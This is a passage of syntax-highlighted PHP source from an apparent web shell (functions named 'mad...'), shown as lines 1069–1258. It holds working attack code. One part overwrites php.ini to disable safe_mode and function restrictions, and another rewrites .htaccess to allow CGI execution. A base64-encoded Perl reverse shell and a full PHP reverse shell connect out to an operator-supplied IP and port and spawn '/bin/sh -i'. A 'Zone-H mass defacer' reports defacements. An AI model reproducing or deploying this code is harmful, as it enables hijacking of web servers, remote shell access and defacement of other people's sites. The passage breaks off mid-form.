<span class="lineno">1069</span>    <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p1&#39;</span><span class="p">])</span><span class="o">&amp;&amp;</span> <span class="nb">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p1&#39;</span><span class="p">]))</span>
<span class="lineno">1070</span>    <span class="p">{</span>
<span class="lineno">1071</span>     <span class="nv">$fil</span><span class="o">=</span><span class="nb">fopen</span><span class="p">(</span><span class="nv">$GLOBALS</span><span class="p">[</span><span class="s1">&#39;cwd&#39;</span><span class="p">]</span><span class="o">.</span><span class="s2">&quot;php.ini&quot;</span><span class="p">,</span><span class="s2">&quot;w&quot;</span><span class="p">);</span>
<span class="lineno">1072</span>       <span class="nb">fwrite</span><span class="p">(</span><span class="nv">$fil</span><span class="p">,</span><span class="s1">&#39;safe_mode=OFF</span>
<span class="lineno">1073</span> <span class="s1">disable_functions=NONE&#39;</span><span class="p">);</span>
<span class="lineno">1074</span>      <span class="nb">fclose</span><span class="p">(</span><span class="nv">$fil</span><span class="p">);</span>
<span class="lineno">1075</span>     <span class="p">}</span>
<span class="lineno">1076</span>     <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p3&#39;</span><span class="p">])</span> <span class="o">&amp;&amp;</span> <span class="nb">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p3&#39;</span><span class="p">]))</span>
<span class="lineno">1077</span>     <span class="p">{</span>
<span class="lineno">1078</span>     <span class="nv">$fil</span><span class="o">=</span><span class="nb">fopen</span><span class="p">(</span><span class="nv">$GLOBALS</span><span class="p">[</span><span class="s1">&#39;cwd&#39;</span><span class="p">]</span><span class="o">.</span><span class="s2">&quot;.htaccess&quot;</span><span class="p">,</span><span class="s2">&quot;w&quot;</span><span class="p">);</span>
<span class="lineno">1079</span>     <span class="nb">fwrite</span><span class="p">(</span><span class="nv">$fil</span><span class="p">,</span><span class="s1">&#39;Options FollowSymLinks MultiViews Indexes ExecCGI</span>
<span class="lineno">1080</span> <span class="s1">AddType application/x-httpd-cgi .sh</span>
<span class="lineno">1081</span> <span class="s1">AddHandler cgi-script .pl</span>
<span class="lineno">1082</span> <span class="s1">AddHandler cgi-script .pl&#39;</span><span class="p">);</span>
<span class="lineno">1083</span>      <span class="nb">fclose</span><span class="p">(</span><span class="nv">$fil</span><span class="p">);</span> 
<span class="lineno">1084</span>     <span class="p">}</span>
<span class="lineno">1085</span>     <span class="k">echo</span> <span class="s2">&quot;&amp;lt;br&amp;gt;&amp;lt;/div&amp;gt;&quot;</span><span class="p">;</span>
<span class="lineno">1086</span>     <span class="nx">madfooter</span><span class="p">();</span>
<span class="lineno">1087</span>     
<span class="lineno">1088</span> <span class="p">}</span>
<span class="lineno">1089</span> 
<span class="lineno">1090</span> <span class="k">function</span> <span class="nf">madconnect</span><span class="p">()</span>
<span class="lineno">1091</span> <span class="p">{</span>
<span class="lineno">1092</span>  <span class="nx">madhead</span><span class="p">();</span>
<span class="lineno">1093</span>  <span class="nv">$back_connect_p</span><span class="o">=</span><span class="s2">&quot;IyEvdXNyL2Jpbi9wZXJsDQp1c2UgU29ja2V0Ow0KJGlhZGRyPWluZXRfYXRvbigkQVJHVlswXSkgfHwgZGllKCJFcnJvcjogJCFcbiIpOw0KJHBhZGRyPXNvY2thZGRyX2luKCRBUkdWWzFdLCAkaWFkZHIpIHx8IGRpZSgiRXJyb3I6ICQhXG4iKTsNCiRwcm90bz1nZXRwcm90b2J5bmFtZSgndGNwJyk7DQpzb2NrZXQoU09DS0VULCBQRl9JTkVULCBTT0NLX1NUUkVBTSwgJHByb3RvKSB8fCBkaWUoIkVycm9yOiAkIVxuIik7DQpjb25uZWN0KFNPQ0tFVCwgJHBhZGRyKSB8fCBkaWUoIkVycm9yOiAkIVxuIik7DQpvcGVuKFNURElOLCAiPiZTT0NLRVQiKTsNCm9wZW4oU1RET1VULCAiPiZTT0NLRVQiKTsNCm9wZW4oU1RERVJSLCAiPiZTT0NLRVQiKTsNCnN5c3RlbSgnL2Jpbi9zaCAtaScpOw0KY2xvc2UoU1RESU4pOw0KY2xvc2UoU1RET1VUKTsNCmNsb3NlKFNUREVSUik7&quot;</span><span class="p">;</span>
<span class="lineno">1094</span>  <span class="k">echo</span> <span class="s2">&quot;&amp;lt;div class=header&amp;gt;&amp;lt;center&amp;gt;&amp;lt;h3&amp;gt;&amp;lt;span&amp;gt;| PERL AND PHP(threads) BACK CONNECT |&amp;lt;/span&amp;gt;&amp;lt;/h3&amp;gt;&quot;</span><span class="p">;</span>
<span class="lineno">1095</span>  <span class="k">echo</span> <span class="s2">&quot;&amp;lt;form  onSubmit=</span><span class="se">\&quot;</span><span class="s2">g(null,null,&#39;bcp&#39;,this.server.value,this.port.value);return false;</span><span class="se">\&quot;</span><span class="s2">&amp;gt;&amp;lt;span&amp;gt;PERL BACK CONNECT&amp;lt;/span&amp;gt;&amp;lt;br&amp;gt;IP: &amp;lt;input type=&#39;text&#39; name=&#39;server&#39; value=&#39;&quot;</span><span class="o">.</span> <span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">&#39;REMOTE_ADDR&#39;</span><span class="p">]</span> <span class="o">.</span><span class="s2">&quot;&#39;&amp;gt; Port: &amp;lt;input type=&#39;text&#39; name=&#39;port&#39; value=&#39;443&#39;&amp;gt; &amp;lt;input type=submit value=&#39;&amp;gt;&amp;gt;&#39;&amp;gt;&amp;lt;/form&amp;gt;&quot;</span><span class="p">;</span>
<span class="lineno">1096</span>  <span class="k">echo</span> <span class="s2">&quot;&amp;lt;br&amp;gt;&amp;lt;form  onSubmit=</span><span class="se">\&quot;</span><span class="s2">g(null,null,&#39;php&#39;,this.server.value,this.port.value);return false;</span><span class="se">\&quot;</span><span class="s2">&amp;gt;&amp;lt;span&amp;gt;PHP BACK CONNECT&amp;lt;/span&amp;gt;&amp;lt;br&amp;gt;IP: &amp;lt;input type=&#39;text&#39; name=&#39;server&#39; value=&#39;&quot;</span><span class="o">.</span> <span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">&#39;REMOTE_ADDR&#39;</span><span class="p">]</span> <span class="o">.</span><span class="s2">&quot;&#39;&amp;gt; Port: &amp;lt;input type=&#39;text&#39; name=&#39;port&#39; value=&#39;443&#39;&amp;gt; &amp;lt;input type=submit value=&#39;&amp;gt;&amp;gt;&#39;&amp;gt;&amp;lt;/form&amp;gt;&amp;lt;/center&amp;gt;&quot;</span><span class="p">;</span>
<span class="lineno">1097</span>  <span class="k">if</span><span class="p">(</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p1&#39;</span><span class="p">]))</span> <span class="p">{</span>
<span class="lineno">1098</span>        <span class="k">function</span> <span class="nf">cf</span><span class="p">(</span><span class="nv">$f</span><span class="p">,</span><span class="nv">$t</span><span class="p">)</span> <span class="p">{</span>
<span class="lineno">1099</span>            <span class="nv">$w</span> <span class="o">=</span> <span class="o">@</span><span class="nb">fopen</span><span class="p">(</span><span class="nv">$f</span><span class="p">,</span><span class="s2">&quot;w&quot;</span><span class="p">)</span> <span class="k">or</span> <span class="o">@</span><span class="nb">function_exists</span><span class="p">(</span><span class="s1">&#39;file_put_contents&#39;</span><span class="p">);</span>
<span class="lineno">1100</span>            <span class="k">if</span><span class="p">(</span><span class="nv">$w</span><span class="p">){</span>
<span class="lineno">1101</span>                <span class="o">@</span><span class="nb">fwrite</span><span class="p">(</span><span class="nv">$w</span><span class="p">,</span><span class="o">@</span><span class="nb">base64_decode</span><span class="p">(</span><span class="nv">$t</span><span class="p">));</span>
<span class="lineno">1102</span>                <span class="o">@</span><span class="nb">fclose</span><span class="p">(</span><span class="nv">$w</span><span class="p">);</span>
<span class="lineno">1103</span>            <span class="p">}</span>
<span class="lineno">1104</span>        <span class="p">}</span>
<span class="lineno">1105</span>        <span class="k">if</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p1&#39;</span><span class="p">]</span> <span class="o">==</span> <span class="s1">&#39;bcp&#39;</span><span class="p">)</span> <span class="p">{</span>
<span class="lineno">1106</span>            <span class="nx">cf</span><span class="p">(</span><span class="s2">&quot;/tmp/bc.pl&quot;</span><span class="p">,</span><span class="nv">$back_connect_p</span><span class="p">);</span>
<span class="lineno">1107</span>            <span class="nv">$out</span> <span class="o">=</span> <span class="nx">madEx</span><span class="p">(</span><span class="s2">&quot;perl /tmp/bc.pl &quot;</span><span class="o">.</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p2&#39;</span><span class="p">]</span><span class="o">.</span><span class="s2">&quot; &quot;</span><span class="o">.</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p3&#39;</span><span class="p">]</span><span class="o">.</span><span class="s2">&quot; 1&amp;gt;/dev/null 2&amp;gt;&amp;1 &amp;&quot;</span><span class="p">);</span>
<span class="lineno">1108</span>            <span class="k">echo</span> <span class="s2">&quot;&amp;lt;pre class=ml1 style=&#39;margin-top:5px&#39;&amp;gt;Successfully opened reverse shell to &quot;</span><span class="o">.</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p2&#39;</span><span class="p">]</span><span class="o">.</span><span class="s2">&quot;:&quot;</span><span class="o">.</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p3&#39;</span><span class="p">]</span><span class="o">.</span><span class="s2">&quot;&amp;lt;br&amp;gt;Connecting...&amp;lt;/pre&amp;gt;&quot;</span><span class="p">;</span>
<span class="lineno">1109</span>             <span class="o">@</span><span class="nb">unlink</span><span class="p">(</span><span class="s2">&quot;/tmp/bc.pl&quot;</span><span class="p">);</span>
<span class="lineno">1110</span>        <span class="p">}</span>
<span class="lineno">1111</span>         <span class="k">if</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p1&#39;</span><span class="p">]</span><span class="o">==</span><span class="s1">&#39;php&#39;</span><span class="p">)</span>
<span class="lineno">1112</span>  <span class="p">{</span>
<span class="lineno">1113</span>             
<span class="lineno">1114</span> <span class="o">@</span><span class="nb">set_time_limit</span> <span class="p">(</span><span class="mi">0</span><span class="p">);</span>
<span class="lineno">1115</span> <span class="nv">$ip</span> <span class="o">=</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p2&#39;</span><span class="p">];</span> 
<span class="lineno">1116</span> <span class="nv">$port</span> <span class="o">=</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p3&#39;</span><span class="p">];</span>     
<span class="lineno">1117</span> <span class="nv">$chunk_size</span> <span class="o">=</span> <span class="mi">1400</span><span class="p">;</span>
<span class="lineno">1118</span> <span class="nv">$write_a</span> <span class="o">=</span> <span class="k">null</span><span class="p">;</span>
<span class="lineno">1119</span> <span class="nv">$error_a</span> <span class="o">=</span> <span class="k">null</span><span class="p">;</span>
<span class="lineno">1120</span> <span class="nv">$shell</span> <span class="o">=</span> <span class="s1">&#39;uname -a; w; id; /bin/sh -i&#39;</span><span class="p">;</span>
<span class="lineno">1121</span> <span class="nv">$daemon</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
<span class="lineno">1122</span> <span class="nv">$debug</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
<span class="lineno">1123</span> <span class="k">echo</span> <span class="s2">&quot;&amp;lt;pre class=ml1 style=&#39;margin-top:5px&#39;&amp;gt;&quot;</span><span class="p">;</span>
<span class="lineno">1124</span> 
<span class="lineno">1125</span> <span class="k">if</span> <span class="p">(</span><span class="nb">function_exists</span><span class="p">(</span><span class="s1">&#39;pcntl_fork&#39;</span><span class="p">))</span> <span class="p">{</span>
<span class="lineno">1126</span>    
<span class="lineno">1127</span>    <span class="nv">$pid</span> <span class="o">=</span> <span class="nb">pcntl_fork</span><span class="p">();</span>
<span class="lineno">1128</span>    
<span class="lineno">1129</span>    <span class="k">if</span> <span class="p">(</span><span class="nv">$pid</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
<span class="lineno">1130</span>        <span class="k">echo</span> <span class="s2">&quot;Cant fork!&amp;lt;br&amp;gt;&quot;</span><span class="p">;</span>
<span class="lineno">1131</span>        <span class="k">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
<span class="lineno">1132</span>    <span class="p">}</span>
<span class="lineno">1133</span>    
<span class="lineno">1134</span>    <span class="k">if</span> <span class="p">(</span><span class="nv">$pid</span><span class="p">)</span> <span class="p">{</span>
<span class="lineno">1135</span>        <span class="k">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>  
<span class="lineno">1136</span>    <span class="p">}</span>
<span class="lineno">1137</span> 
<span class="lineno">1138</span>    <span class="k">if</span> <span class="p">(</span><span class="nb">posix_setsid</span><span class="p">()</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
<span class="lineno">1139</span>        <span class="k">echo</span> <span class="s2">&quot;Error: Can&#39;t setsid()&amp;lt;br&amp;gt;&quot;</span><span class="p">;</span>
<span class="lineno">1140</span>        <span class="k">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
<span class="lineno">1141</span>    <span class="p">}</span>
<span class="lineno">1142</span> 
<span class="lineno">1143</span>    <span class="nv">$daemon</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
<span class="lineno">1144</span> <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
<span class="lineno">1145</span>    <span class="k">echo</span> <span class="s2">&quot;WARNING: Failed to daemonise.  This is quite common and not fatal&amp;lt;br&amp;gt;&quot;</span><span class="p">;</span>
<span class="lineno">1146</span> <span class="p">}</span>
<span class="lineno">1147</span> 
<span class="lineno">1148</span> <span class="nb">chdir</span><span class="p">(</span><span class="s2">&quot;/&quot;</span><span class="p">);</span>
<span class="lineno">1149</span> 
<span class="lineno">1150</span> <span class="nb">umask</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
<span class="lineno">1151</span> 
<span class="lineno">1152</span> <span class="nv">$sock</span> <span class="o">=</span> <span class="nb">fsockopen</span><span class="p">(</span><span class="nv">$ip</span><span class="p">,</span> <span class="nv">$port</span><span class="p">,</span> <span class="nv">$errno</span><span class="p">,</span> <span class="nv">$errstr</span><span class="p">,</span> <span class="mi">30</span><span class="p">);</span>
<span class="lineno">1153</span> <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nv">$sock</span><span class="p">)</span> <span class="p">{</span>
<span class="lineno">1154</span>    <span class="k">echo</span> <span class="s2">&quot;</span><span class="si">$errstr</span><span class="s2"> (</span><span class="si">$errno</span><span class="s2">)&quot;</span><span class="p">;</span>
<span class="lineno">1155</span>    <span class="k">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
<span class="lineno">1156</span> <span class="p">}</span>
<span class="lineno">1157</span> 
<span class="lineno">1158</span> 
<span class="lineno">1159</span> <span class="nv">$descriptorspec</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span>
<span class="lineno">1160</span>    <span class="mi">0</span> <span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span> <span class="k">array</span><span class="p">(</span><span class="s2">&quot;pipe&quot;</span><span class="p">,</span> <span class="s2">&quot;r&quot;</span><span class="p">),</span>  
<span class="lineno">1161</span>    <span class="mi">1</span> <span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span> <span class="k">array</span><span class="p">(</span><span class="s2">&quot;pipe&quot;</span><span class="p">,</span> <span class="s2">&quot;w&quot;</span><span class="p">),</span>  
<span class="lineno">1162</span>    <span class="mi">2</span> <span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span> <span class="k">array</span><span class="p">(</span><span class="s2">&quot;pipe&quot;</span><span class="p">,</span> <span class="s2">&quot;w&quot;</span><span class="p">)</span>   
<span class="lineno">1163</span> <span class="p">);</span>
<span class="lineno">1164</span> 
<span class="lineno">1165</span> <span class="nv">$process</span> <span class="o">=</span> <span class="nb">proc_open</span><span class="p">(</span><span class="nv">$shell</span><span class="p">,</span> <span class="nv">$descriptorspec</span><span class="p">,</span> <span class="nv">$pipes</span><span class="p">);</span>
<span class="lineno">1166</span> 
<span class="lineno">1167</span> <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nb">is_resource</span><span class="p">(</span><span class="nv">$process</span><span class="p">))</span> <span class="p">{</span>
<span class="lineno">1168</span>    <span class="k">echo</span> <span class="s2">&quot;ERROR: Can&#39;t spawn shell&amp;lt;br&amp;gt;&quot;</span><span class="p">;</span>
<span class="lineno">1169</span>    <span class="k">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
<span class="lineno">1170</span> <span class="p">}</span>
<span class="lineno">1171</span> 
<span class="lineno">1172</span> 
<span class="lineno">1173</span> <span class="o">@</span><span class="nb">stream_set_blocking</span><span class="p">(</span><span class="nv">$pipes</span><span class="p">[</span><span class="mi">0</span><span class="p">],</span> <span class="mi">0</span><span class="p">);</span>
<span class="lineno">1174</span> <span class="o">@</span><span class="nb">stream_set_blocking</span><span class="p">(</span><span class="nv">$pipes</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="mi">0</span><span class="p">);</span>
<span class="lineno">1175</span> <span class="o">@</span><span class="nb">stream_set_blocking</span><span class="p">(</span><span class="nv">$pipes</span><span class="p">[</span><span class="mi">2</span><span class="p">],</span> <span class="mi">0</span><span class="p">);</span>
<span class="lineno">1176</span> <span class="o">@</span><span class="nb">stream_set_blocking</span><span class="p">(</span><span class="nv">$sock</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
<span class="lineno">1177</span> 
<span class="lineno">1178</span> <span class="k">echo</span> <span class="s2">&quot;Successfully opened reverse shell to </span><span class="si">$ip</span><span class="s2">:</span><span class="si">$port</span><span class="s2">&amp;lt;br&amp;gt;&quot;</span><span class="p">;</span>
<span class="lineno">1179</span> 
<span class="lineno">1180</span> <span class="k">while</span> <span class="p">(</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
<span class="lineno">1181</span>    <span class="k">if</span> <span class="p">(</span><span class="nb">feof</span><span class="p">(</span><span class="nv">$sock</span><span class="p">))</span> <span class="p">{</span>
<span class="lineno">1182</span>        <span class="k">echo</span> <span class="s2">&quot;ERROR: Shell connection terminated&amp;lt;br&amp;gt;&quot;</span><span class="p">;</span>
<span class="lineno">1183</span>        <span class="k">break</span><span class="p">;</span>
<span class="lineno">1184</span>    <span class="p">}</span>
<span class="lineno">1185</span> 
<span class="lineno">1186</span>    <span class="k">if</span> <span class="p">(</span><span class="nb">feof</span><span class="p">(</span><span class="nv">$pipes</span><span class="p">[</span><span class="mi">1</span><span class="p">]))</span> <span class="p">{</span>
<span class="lineno">1187</span>        <span class="k">echo</span> <span class="s2">&quot;ERROR: Shell process terminated&amp;lt;br&amp;gt;&quot;</span><span class="p">;</span>
<span class="lineno">1188</span>        <span class="k">break</span><span class="p">;</span>
<span class="lineno">1189</span>    <span class="p">}</span>
<span class="lineno">1190</span> 
<span class="lineno">1191</span>    
<span class="lineno">1192</span>    <span class="nv">$read_a</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span><span class="nv">$sock</span><span class="p">,</span> <span class="nv">$pipes</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="nv">$pipes</span><span class="p">[</span><span class="mi">2</span><span class="p">]);</span>
<span class="lineno">1193</span>    <span class="nv">$num_changed_sockets</span><span class="o">=@</span><span class="nb">stream_select</span><span class="p">(</span><span class="nv">$read_a</span><span class="p">,</span> <span class="nv">$write_a</span><span class="p">,</span> <span class="nv">$error_a</span><span class="p">,</span> <span class="k">null</span><span class="p">);</span>
<span class="lineno">1194</span> 
<span class="lineno">1195</span>    <span class="k">if</span> <span class="p">(</span><span class="nb">in_array</span><span class="p">(</span><span class="nv">$sock</span><span class="p">,</span> <span class="nv">$read_a</span><span class="p">))</span> <span class="p">{</span>
<span class="lineno">1196</span>        <span class="k">if</span> <span class="p">(</span><span class="nv">$debug</span><span class="p">)</span> <span class="k">echo</span> <span class="s2">&quot;SOCK READ&amp;lt;br&amp;gt;&quot;</span><span class="p">;</span>
<span class="lineno">1197</span>        <span class="nv">$input</span><span class="o">=</span><span class="nb">fread</span><span class="p">(</span><span class="nv">$sock</span><span class="p">,</span> <span class="nv">$chunk_size</span><span class="p">);</span>
<span class="lineno">1198</span>        <span class="k">if</span> <span class="p">(</span><span class="nv">$debug</span><span class="p">)</span> <span class="k">echo</span> <span class="s2">&quot;SOCK: </span><span class="si">$input</span><span class="s2">&amp;lt;br&amp;gt;&quot;</span><span class="p">;</span>
<span class="lineno">1199</span>        <span class="nb">fwrite</span><span class="p">(</span><span class="nv">$pipes</span><span class="p">[</span><span class="mi">0</span><span class="p">],</span> <span class="nv">$input</span><span class="p">);</span>
<span class="lineno">1200</span>    <span class="p">}</span>
<span class="lineno">1201</span> 
<span class="lineno">1202</span>    <span class="k">if</span> <span class="p">(</span><span class="nb">in_array</span><span class="p">(</span><span class="nv">$pipes</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="nv">$read_a</span><span class="p">))</span> <span class="p">{</span>
<span class="lineno">1203</span>        <span class="k">if</span> <span class="p">(</span><span class="nv">$debug</span><span class="p">)</span> <span class="k">echo</span> <span class="s2">&quot;STDOUT READ&amp;lt;br&amp;gt;&quot;</span><span class="p">;</span>
<span class="lineno">1204</span>        <span class="nv">$input</span> <span class="o">=</span> <span class="nb">fread</span><span class="p">(</span><span class="nv">$pipes</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="nv">$chunk_size</span><span class="p">);</span>
<span class="lineno">1205</span>        <span class="k">if</span> <span class="p">(</span><span class="nv">$debug</span><span class="p">)</span> <span class="k">echo</span> <span class="s2">&quot;STDOUT: </span><span class="si">$input</span><span class="s2">&amp;lt;br&amp;gt;&quot;</span><span class="p">;</span>
<span class="lineno">1206</span>        <span class="nb">fwrite</span><span class="p">(</span><span class="nv">$sock</span><span class="p">,</span> <span class="nv">$input</span><span class="p">);</span>
<span class="lineno">1207</span>    <span class="p">}</span>
<span class="lineno">1208</span> 
<span class="lineno">1209</span>    
<span class="lineno">1210</span>    <span class="k">if</span> <span class="p">(</span><span class="nb">in_array</span><span class="p">(</span><span class="nv">$pipes</span><span class="p">[</span><span class="mi">2</span><span class="p">],</span> <span class="nv">$read_a</span><span class="p">))</span> <span class="p">{</span>
<span class="lineno">1211</span>        <span class="k">if</span> <span class="p">(</span><span class="nv">$debug</span><span class="p">)</span> <span class="k">echo</span> <span class="s2">&quot;STDERR READ&amp;lt;br&amp;gt;&quot;</span><span class="p">;</span>
<span class="lineno">1212</span>        <span class="nv">$input</span> <span class="o">=</span> <span class="nb">fread</span><span class="p">(</span><span class="nv">$pipes</span><span class="p">[</span><span class="mi">2</span><span class="p">],</span> <span class="nv">$chunk_size</span><span class="p">);</span>
<span class="lineno">1213</span>        <span class="k">if</span> <span class="p">(</span><span class="nv">$debug</span><span class="p">)</span> <span class="k">echo</span> <span class="s2">&quot;STDERR: </span><span class="si">$input</span><span class="s2">&amp;lt;br&amp;gt;&quot;</span><span class="p">;</span>
<span class="lineno">1214</span>        <span class="nb">fwrite</span><span class="p">(</span><span class="nv">$sock</span><span class="p">,</span> <span class="nv">$input</span><span class="p">);</span>
<span class="lineno">1215</span>    <span class="p">}</span>
<span class="lineno">1216</span> <span class="p">}</span>
<span class="lineno">1217</span> 
<span class="lineno">1218</span> <span class="nb">fclose</span><span class="p">(</span><span class="nv">$sock</span><span class="p">);</span>
<span class="lineno">1219</span> <span class="nb">fclose</span><span class="p">(</span><span class="nv">$pipes</span><span class="p">[</span><span class="mi">0</span><span class="p">]);</span>
<span class="lineno">1220</span> <span class="nb">fclose</span><span class="p">(</span><span class="nv">$pipes</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>
<span class="lineno">1221</span> <span class="nb">fclose</span><span class="p">(</span><span class="nv">$pipes</span><span class="p">[</span><span class="mi">2</span><span class="p">]);</span>
<span class="lineno">1222</span> <span class="nb">proc_close</span><span class="p">(</span><span class="nv">$process</span><span class="p">);</span>
<span class="lineno">1223</span> 
<span class="lineno">1224</span> <span class="k">echo</span> <span class="s2">&quot;&amp;lt;/pre&amp;gt;&quot;</span><span class="p">;</span>
<span class="lineno">1225</span> <span class="p">}</span>
<span class="lineno">1226</span> 
<span class="lineno">1227</span> <span class="p">}</span>   
<span class="lineno">1228</span>  <span class="k">echo</span> <span class="s2">&quot;&amp;lt;/div&amp;gt;&quot;</span><span class="p">;</span>
<span class="lineno">1229</span>  <span class="nx">madfooter</span><span class="p">();</span>
<span class="lineno">1230</span> <span class="p">}</span>
<span class="lineno">1231</span> <span class="k">function</span> <span class="nf">ZoneH</span><span class="p">(</span><span class="nv">$url</span><span class="p">,</span> <span class="nv">$hacker</span><span class="p">,</span> <span class="nv">$hackmode</span><span class="p">,</span><span class="nv">$reson</span><span class="p">,</span> <span class="nv">$site</span> <span class="p">)</span>
<span class="lineno">1232</span> <span class="p">{</span>
<span class="lineno">1233</span>    <span class="nv">$k</span> <span class="o">=</span> <span class="nb">curl_init</span><span class="p">();</span>
<span class="lineno">1234</span>    <span class="nb">curl_setopt</span><span class="p">(</span><span class="nv">$k</span><span class="p">,</span> <span class="nx">CURLOPT_URL</span><span class="p">,</span> <span class="nv">$url</span><span class="p">);</span>
<span class="lineno">1235</span>    <span class="nb">curl_setopt</span><span class="p">(</span><span class="nv">$k</span><span class="p">,</span><span class="nx">CURLOPT_POST</span><span class="p">,</span><span class="k">true</span><span class="p">);</span>
<span class="lineno">1236</span>    <span class="nb">curl_setopt</span><span class="p">(</span><span class="nv">$k</span><span class="p">,</span> <span class="nx">CURLOPT_POSTFIELDS</span><span class="p">,</span><span class="s2">&quot;defacer=&quot;</span><span class="o">.</span><span class="nv">$hacker</span><span class="o">.</span><span class="s2">&quot;&amp;domain1=&quot;</span><span class="o">.</span> <span class="nv">$site</span><span class="o">.</span><span class="s2">&quot;&amp;hackmode=&quot;</span><span class="o">.</span><span class="nv">$hackmode</span><span class="o">.</span><span class="s2">&quot;&amp;reason=&quot;</span><span class="o">.</span><span class="nv">$reson</span><span class="p">);</span>
<span class="lineno">1237</span>    <span class="nb">curl_setopt</span><span class="p">(</span><span class="nv">$k</span><span class="p">,</span><span class="nx">CURLOPT_FOLLOWLOCATION</span><span class="p">,</span> <span class="k">true</span><span class="p">);</span>
<span class="lineno">1238</span>    <span class="nb">curl_setopt</span><span class="p">(</span><span class="nv">$k</span><span class="p">,</span> <span class="nx">CURLOPT_RETURNTRANSFER</span><span class="p">,</span> <span class="k">true</span><span class="p">);</span>
<span class="lineno">1239</span>    <span class="nv">$kubra</span> <span class="o">=</span> <span class="nb">curl_exec</span><span class="p">(</span><span class="nv">$k</span><span class="p">);</span>
<span class="lineno">1240</span>    <span class="nb">curl_close</span><span class="p">(</span><span class="nv">$k</span><span class="p">);</span>
<span class="lineno">1241</span>    <span class="k">return</span> <span class="nv">$kubra</span><span class="p">;</span>
<span class="lineno">1242</span> <span class="p">}</span>
<span class="lineno">1243</span> <span class="k">function</span> <span class="nf">madzoneh</span><span class="p">()</span>
<span class="lineno">1244</span> <span class="p">{</span>
<span class="lineno">1245</span>     <span class="nx">madhead</span><span class="p">();</span>
<span class="lineno">1246</span>     <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nb">function_exists</span><span class="p">(</span><span class="s1">&#39;curl_version&#39;</span><span class="p">))</span>
<span class="lineno">1247</span>     <span class="p">{</span>
<span class="lineno">1248</span>         <span class="k">echo</span> <span class="s2">&quot;&amp;lt;pre class=ml1 style=&#39;margin-top:5px&#39;&amp;gt;&amp;lt;center&amp;gt;&amp;lt;font color=red&amp;gt;PHP CURL NOT EXIT&amp;lt;/font&amp;gt;&amp;lt;/center&amp;gt;&amp;lt;/pre&amp;gt;&quot;</span><span class="p">;</span>
<span class="lineno">1249</span>     <span class="p">}</span>
<span class="lineno">1250</span>     <span class="k">echo</span> <span class="s2">&quot;&amp;lt;div class=header&amp;gt;&amp;lt;center&amp;gt;&amp;lt;br&amp;gt;&quot;</span><span class="p">;</span>
<span class="lineno">1251</span>     <span class="k">echo</span> <span class="s1">&#39;&amp;lt;h3&amp;gt;&amp;lt;span&amp;gt;|ZONE-H MASS DEFACER |&amp;lt;/span&amp;gt;&amp;lt;/h3&amp;gt;</span>
<span class="lineno">1252</span> <span class="s1">    &amp;lt;form  onSubmit=&quot;g(null,null,this.defacer.value,this.hackmode.value,this.domain.value);return false;&quot; &amp;gt;</span>
<span class="lineno">1253</span> <span class="s1">    &amp;lt;span&amp;gt;| Notifier |&amp;lt;/span&amp;gt;&amp;lt;br&amp;gt;</span>
<span class="lineno">1254</span> <span class="s1">&amp;lt;input type=&quot;text&quot; name=defacer size=&quot;40&quot; value=&quot;Attacker&quot; /&amp;gt;&amp;lt;br&amp;gt;</span>
<span class="lineno">1255</span> <span class="s1">&amp;lt;select name=hackmode&amp;gt;</span>
<span class="lineno">1256</span> <span class="s1">&amp;lt;option &amp;gt;--------SELECT--------&amp;lt;/option&amp;gt;</span>
<span class="lineno">1257</span> <span class="s1">&amp;lt;option value=&quot;1&quot;&amp;gt;known vulnerability (i.e. unpatched system)&amp;lt;/option&amp;gt;</span>
<span class="lineno">1258</span> <span class="s1">&amp;lt;option value=&quot;2&quot; &amp;gt;undisclosed (new) vulnerability&amp;lt;/option&amp;gt;</span>
